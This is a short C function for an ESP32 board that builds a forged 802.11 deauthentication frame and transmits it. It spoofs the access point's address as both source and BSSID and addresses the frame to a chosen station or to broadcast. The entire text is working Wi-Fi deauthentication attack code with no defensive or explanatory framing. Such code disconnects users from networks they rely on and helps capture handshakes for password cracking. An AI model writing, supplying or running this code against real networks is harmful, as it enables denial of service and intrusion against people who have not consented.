void send_deauth_frame(uint8_t* target_bssid, uint8_t* station_bssid, uint8_t channel) {
  // Ensure we are on the correct channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  uint8_t deauth_frame[26];
  int idx = 0;
  
  // Frame Control: Type=Management (00), Subtype=Deauth (1100)
  deauth_frame[idx++] = 0xC0;  // FC byte 1: version=0, type=0, subtype=12 (deauth)
  deauth_frame[idx++] = 0x00;  // FC byte 2: flags = 0
  
  // Duration (set to 0)
  deauth_frame[idx++] = 0x00;
  deauth_frame[idx++] = 0x00;
  
  // Destination address (station or broadcast)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = station_bssid[i];
  
  // Source address (AP BSSID)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = target_bssid[i];
  
  // BSSID (same as source)
  for (int i = 0; i < 6; i++) deauth_frame[idx++] = target_bssid[i];
  
  // Sequence control (fragment number 0, sequence number random)
  uint16_t seq = random(0, 4095);
  deauth_frame[idx++] = seq & 0xFF;
  deauth_frame[idx++] = (seq >> 8) & 0xFF;
  
  // Fixed parameters: Reason code (7 = class 3 frame received from non-associated station)
  deauth_frame[idx++] = 0x07;  // Reason code low byte
  deauth_frame[idx++] = 0x00;  // high byte
  
  // Send the frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, idx, false);
}

